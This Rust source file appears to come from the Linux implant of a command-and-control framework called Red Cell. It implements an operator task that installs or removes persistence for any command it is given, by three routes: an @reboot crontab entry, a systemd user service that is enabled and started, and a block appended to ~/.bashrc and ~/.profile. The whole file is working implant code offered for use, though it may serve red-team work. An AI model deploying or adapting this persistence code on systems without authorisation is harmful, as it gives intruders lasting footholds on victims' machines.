//! `CommandPersist` (ID 3000): Linux persistence mechanisms.

use std::fs;
use std::path::PathBuf;
use std::process::Stdio;

use red_cell_common::demon::PhantomPersistMethod;
use red_cell_common::demon::PhantomPersistOp;
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::PhantomState;
use super::types::PendingCallback;

/// Marker appended to every crontab line and shell-rc block managed by Phantom.
/// Used to identify and remove our entries on request.
const PERSIST_MARKER: &str = "# red-cell-c2";

/// Unique label used as the systemd user unit name and in the shell-rc block.
const PERSIST_UNIT_NAME: &str = "red-cell";

/// Handle `CommandPersist` (ID 3000): install or remove a Linux persistence mechanism.
///
/// Payload layout (all little-endian):
/// ```text
/// u32  method   — PhantomPersistMethod (1=Cron, 2=SystemdUser, 3=ShellRc)
/// u32  op       — PhantomPersistOp (0=Install, 1=Remove)
/// str  command  — length-prefixed UTF-8 command string (required for Install,
///                 ignored for Remove)
/// ```
pub(super) async fn execute_persist(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);

    let method_raw = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative persist method"))?;
    let method = PhantomPersistMethod::try_from(method_raw)
        .map_err(|_| PhantomError::TaskParse("unknown persist method"))?;

    let op_raw = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative persist op"))?;
    let op = PhantomPersistOp::try_from(op_raw)
        .map_err(|_| PhantomError::TaskParse("unknown persist op"))?;

    let command_str = match op {
        PhantomPersistOp::Install => parser.string()?,
        PhantomPersistOp::Remove => String::new(),
    };

    let result = match method {
        PhantomPersistMethod::Cron => persist_cron(op, &command_str).await,
        PhantomPersistMethod::SystemdUser => persist_systemd_user(op, &command_str).await,
        PhantomPersistMethod::ShellRc => persist_shell_rc(op, &command_str),
    };

    match result {
        Ok(msg) => state.queue_callback(PendingCallback::Output { request_id, text: msg }),
        Err(msg) => state.queue_callback(PendingCallback::Error { request_id, text: msg }),
    }

    Ok(())
}

/// Install or remove an `@reboot` crontab entry.
///
/// Install appends `@reboot <command> # red-cell-c2` to the current user's
/// crontab if the marker is not already present.  Remove filters out any line
/// containing the marker.
async fn persist_cron(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    // Read existing crontab; treat an empty/missing crontab as success.
    let crontab_output = Command::new("crontab")
        .args(["-l"])
        .output()
        .await
        .map_err(|e| format!("crontab -l failed: {e}"))?;

    let existing = if crontab_output.status.success() {
        String::from_utf8_lossy(&crontab_output.stdout).into_owned()
    } else {
        // `crontab -l` exits non-zero when there is no crontab — that is fine.
        String::new()
    };

    let new_crontab = match op {
        PhantomPersistOp::Install => {
            if existing.contains(PERSIST_MARKER) {
                return Ok("cron persistence entry already present".into());
            }
            format!("{existing}@reboot {command} {PERSIST_MARKER}\n")
        }
        PhantomPersistOp::Remove => {
            if !existing.contains(PERSIST_MARKER) {
                return Ok("cron persistence entry not found — nothing removed".into());
            }
            existing
                .lines()
                .filter(|l| !l.contains(PERSIST_MARKER))
                .map(|l| format!("{l}\n"))
                .collect()
        }
    };

    // Write back via `crontab -`.
    let mut child = Command::new("crontab")
        .arg("-")
        .stdin(Stdio::piped())
        .spawn()
        .map_err(|e| format!("crontab - spawn failed: {e}"))?;

    {
        let stdin = child.stdin.as_mut().ok_or_else(|| "crontab stdin unavailable".to_owned())?;
        tokio::io::AsyncWriteExt::write_all(stdin, new_crontab.as_bytes())
            .await
            .map_err(|e| format!("crontab write failed: {e}"))?;
    }

    let status = child.wait().await.map_err(|e| format!("crontab wait failed: {e}"))?;
    if !status.success() {
        return Err(format!("crontab exited with status {status}"));
    }

    Ok(match op {
        PhantomPersistOp::Install => "cron persistence entry installed".into(),
        PhantomPersistOp::Remove => "cron persistence entry removed".into(),
    })
}

/// Install or remove a systemd user service unit at
/// `~/.config/systemd/user/red-cell.service`.
async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
    let unit_dir = PathBuf::from(&home).join(".config/systemd/user");
    let unit_path = unit_dir.join(format!("{PERSIST_UNIT_NAME}.service"));

    match op {
        PhantomPersistOp::Install => {
            fs::create_dir_all(&unit_dir)
                .map_err(|e| format!("create {}: {e}", unit_dir.display()))?;

            let unit_content = format!(
                "[Unit]\n                 Description=Red Cell C2 persistence ({PERSIST_MARKER})\n                 After=default.target\n                 \n                 [Service]\n                 Type=simple\n                 ExecStart={command}\n                 Restart=on-failure\n                 \n                 [Install]\n                 WantedBy=default.target\n"
            );

            fs::write(&unit_path, unit_content)
                .map_err(|e| format!("write {}: {e}", unit_path.display()))?;

            // Reload daemon, then enable + start the unit.
            run_systemctl(&["--user", "daemon-reload"]).await?;
            run_systemctl(&["--user", "enable", &format!("{PERSIST_UNIT_NAME}.service")]).await?;
            run_systemctl(&["--user", "start", &format!("{PERSIST_UNIT_NAME}.service")]).await?;

            Ok(format!("systemd user unit installed at {}", unit_path.display()))
        }
        PhantomPersistOp::Remove => {
            if !unit_path.exists() {
                return Ok("systemd user unit not found — nothing removed".into());
            }

            // Best-effort stop/disable; ignore errors so we still clean up the file.
            let _ =
                run_systemctl(&["--user", "stop", &format!("{PERSIST_UNIT_NAME}.service")]).await;
            let _ = run_systemctl(&["--user", "disable", &format!("{PERSIST_UNIT_NAME}.service")])
                .await;

            fs::remove_file(&unit_path)
                .map_err(|e| format!("remove {}: {e}", unit_path.display()))?;

            run_systemctl(&["--user", "daemon-reload"]).await?;

            Ok(format!("systemd user unit removed from {}", unit_path.display()))
        }
    }
}

/// Run `systemctl` with the given arguments, returning an error string on failure.
async fn run_systemctl(args: &[&str]) -> Result<(), String> {
    let status = Command::new("systemctl")
        .args(args)
        .status()
        .await
        .map_err(|e| format!("systemctl {:?} failed: {e}", args))?;
    if status.success() {
        Ok(())
    } else {
        Err(format!("systemctl {:?} exited with {status}", args))
    }
}

/// Install or remove a persistence stanza in `~/.bashrc` and `~/.profile`.
///
/// Install appends a clearly delimited block to both files if the marker is
/// not already present.  Remove strips the delimited block from both files.
fn persist_shell_rc(op: PhantomPersistOp, command: &str) -> Result<String, String> {
    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_owned())?;
    let targets = [PathBuf::from(&home).join(".bashrc"), PathBuf::from(&home).join(".profile")];

    let begin_marker = format!("# BEGIN {PERSIST_MARKER}");
    let end_marker = format!("# END {PERSIST_MARKER}");

    let mut touched = Vec::new();
    let mut already_present = Vec::new();
    let mut not_found = Vec::new();

    for path in &targets {
        let existing = if path.exists() {
            fs::read_to_string(path).map_err(|e| format!("read {}: {e}", path.display()))?
        } else {
            String::new()
        };

        match op {
            PhantomPersistOp::Install => {
                if existing.contains(&begin_marker) {
                    already_present.push(path.display().to_string());
                    continue;
                }
                let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
                let new_content = format!("{existing}{block}");
                fs::write(path, new_content)
                    .map_err(|e| format!("write {}: {e}", path.display()))?;
                touched.push(path.display().to_string());
            }
            PhantomPersistOp::Remove => {
                if !existing.contains(&begin_marker) {
                    not_found.push(path.display().to_string());
                    continue;
                }
                let new_content = remove_shell_rc_block(&existing, &begin_marker, &end_marker);
                fs::write(path, new_content)
                    .map_err(|e| format!("write {}: {e}", path.display()))?;
                touched.push(path.display().to_string());
            }
        }
    }

    let summary = match op {
        PhantomPersistOp::Install => {
            let mut parts = Vec::new();
            if !touched.is_empty() {
                parts.push(format!("installed in: {}", touched.join(", ")));
            }
            if !already_present.is_empty() {
                parts.push(format!("already present in: {}", already_present.join(", ")));
            }
            parts.join("; ")
        }
        PhantomPersistOp::Remove => {
            let mut parts = Vec::new();
            if !touched.is_empty() {
                parts.push(format!("removed from: {}", touched.join(", ")));
            }
            if !not_found.is_empty() {
                parts.push(format!("not found in: {}", not_found.join(", ")));
            }
            parts.join("; ")
        }
    };

    Ok(format!("shell rc persistence: {summary}"))
}

/// Remove the `BEGIN … END` block from `text`, returning the modified string.
pub(super) fn remove_shell_rc_block(text: &str, begin: &str, end: &str) -> String {
    let mut result = String::with_capacity(text.len());
    let mut inside = false;

    for line in text.lines() {
        if line.trim() == begin {
            inside = true;
            continue;
        }
        if inside {
            if line.trim() == end {
                inside = false;
            }
            continue;
        }
        result.push_str(line);
        result.push('\n');
    }

    result
}
